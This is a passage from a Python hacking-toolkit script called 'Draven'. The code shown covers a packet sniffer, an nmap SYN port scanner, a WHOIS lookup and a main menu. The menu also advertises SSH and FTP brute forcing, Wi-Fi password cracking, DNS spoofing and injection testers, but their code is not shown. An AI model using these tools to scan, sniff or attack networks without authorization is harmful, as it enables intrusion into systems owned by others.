    interface = input(Fore.WHITE + "Enter network interface (e.g., eth0 or Wi-Fi): " + Style.RESET_ALL)
    count = int(input("Enter number of packets to capture (e.g., 50): "))
    
    try:
        print(Fore.YELLOW + f"\nStarting packet sniffer on {interface} (capturing {count} packets)..." + Style.RESET_ALL)
        
        packets = []
        def packet_callback(pkt):
            packets.append(pkt)
            print(Fore.CYAN + pkt.summary() + Style.RESET_ALL)
        
        sniff(iface=interface, prn=packet_callback, count=count)
        
        print(Fore.GREEN + f"\nCaptured {len(packets)} packets" + Style.RESET_ALL)
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def port_scanner():
    clear_screen()
    draven_banner()
    target = input(Fore.WHITE + "Enter target IP: " + Style.RESET_ALL)
    ports = input("Enter ports (e.g., 22,80,443 or 1-1024): ")
    
    try:
        nm = nmap.PortScanner()
        print(Fore.YELLOW + "\nStarting port scan..." + Style.RESET_ALL)
        nm.scan(target, ports, arguments='-T4 -sS')
        
        print(Fore.GREEN + "\n[+] Port Scan Results:" + Style.RESET_ALL)
        for host in nm.all_hosts():
            print(f"\nHost: {host} ({nm[host].hostname()})")
            print(f"State: {nm[host].state()}")
            for proto in nm[host].all_protocols():
                print(f"\nProtocol: {proto}")
                ports = sorted(nm[host][proto].keys())
                for port in ports:
                    state = nm[host][proto][port]['state']
                    print(f"Port {port}: {state}")
        
        print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    
    except nmap.PortScannerError as e:
        print(Fore.RED + f"Nmap error: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Ensure Nmap is installed and in your PATH." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def domain_whois_lookup():
    clear_screen()
    draven_banner()
    domain = input(Fore.WHITE + "Enter domain: " + Style.RESET_ALL)
    
    try:
        print(Fore.YELLOW + "\nPerforming WHOIS lookup..." + Style.RESET_ALL)
        w = whois.whois(domain)
        print(Fore.GREEN + "\n[+] WHOIS Results:" + Style.RESET_ALL)
        print(f"Domain: {w.domain_name}")
        print(f"Registrar: {w.registrar}")
        print(f"Creation Date: {w.creation_date}")
        print(f"Expiration Date: {w.expiration_date}")
        print(f"Name Servers: {', '.join(w.name_servers) if w.name_servers else 'None'}")
        print(f"Status: {', '.join(w.status) if isinstance(w.status, list) else w.status}")
    
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    
    print(Fore.CYAN + "\nResults displayed above. Copy them now if needed." + Style.RESET_ALL)
    input(Fore.WHITE + "\nPress Enter to return..." + Style.RESET_ALL)

def main_menu():
    while True:
        clear_screen()
        draven_banner()
        
        print(Fore.CYAN + "DRAVEN TOOL MENU".center(80) + Style.RESET_ALL)
        print(Fore.CYAN + "[I] INFO".ljust(15) + "github.com/Pharmyx/Draven-Tool".center(50) + Style.RESET_ALL)
        print(Fore.CYAN + "[S] SITE".ljust(25) + "NETWORK SCANNER".center(30) + "NETWORK HACKING".rjust(25) + Style.RESET_ALL)
        print(Fore.BLUE + divider + Style.RESET_ALL)
        print("")
        
        print(Fore.CYAN + "01] Website Crawler".ljust(30) + "07] IP Tracker".ljust(30) + "13] SSH Brute Force".ljust(30) + Style.RESET_ALL)
        print(Fore.CYAN + "02] SQL Injection Tester".ljust(30) + "08] Email OSINT".ljust(30) + "14] FTP Brute Force".ljust(30) + Style.RESET_ALL)
        print(Fore.CYAN + "03] XSS Scanner".ljust(30) + "09] Domain WHOIS Lookup".ljust(30) + "15] Wi-Fi Password Cracker".ljust(30) + Style.RESET_ALL)
        print(Fore.CYAN + "04] Advanced Nmap Scan".ljust(30) + "10] Username Lookup".ljust(30) + "16] Network Traffic Analyzer".ljust(30) + Style.RESET_ALL)
        print(Fore.CYAN + "05] ARP Spoof Detector".ljust(30) + "11] Packet Sniffer".ljust(30) + "17] DNS Spoofer".ljust(30) + Style.RESET_ALL)
        print(Fore.CYAN + "06] Port Scanner (Fast)".ljust(30) + "12] Exit".ljust(30) + "18] MAC Address Changer".ljust(30) + Style.RESET_ALL)
        print(Fore.CYAN + "".ljust(30) + "".ljust(30) + "19] Exit".ljust(30) + Style.RESET_ALL)
        print("")
        print(Fore.BLUE + divider + Style.RESET_ALL)
        choice = input(Fore.WHITE + "draven@draven[~]/Draven $ " + Style.RESET_ALL)
        
        if choice.lower() == "i":
            show_legal_terms()
        elif choice == "1":
            website_crawler()
        elif choice == "2":
            sql_injection_tester()
        elif choice == "3":
            xss_scanner()
        elif choice == "4":
            advanced_nmap_scan()
        elif choice == "5":
            arp_spoof_detector()
        elif choice == "6":
            port_scanner()
        elif choice == "7":
            ip_tracker()
        elif choice == "8":
            email_osint()
        elif choice == "9":
            domain_whois_lookup()
        elif choice == "10":
            username_lookup()
        elif choice == "11":
            packet_sniffer()
        elif choice == "12":
            print(Fore.RED + "\nExiting Draven..." + Style.RESET_ALL)
            break
        elif choice == "13":
            ssh_bruteforce()
        elif choice == "14":
            ftp_bruteforce()
        elif choice == "15":
            wifi_password_cracker()
        elif choice == "16":
            network_traffic_analyzer()
        elif choice == "17":
            dns_spoofer()
        elif choice == "18":
            mac_address_changer()
        elif choice == "19":
            print(Fore.RED + "\nExiting Draven..." + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Invalid choice" + Style.RESET_ALL)
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\nExiting..." + Style.RESET_ALL)
        sys.exit(0)
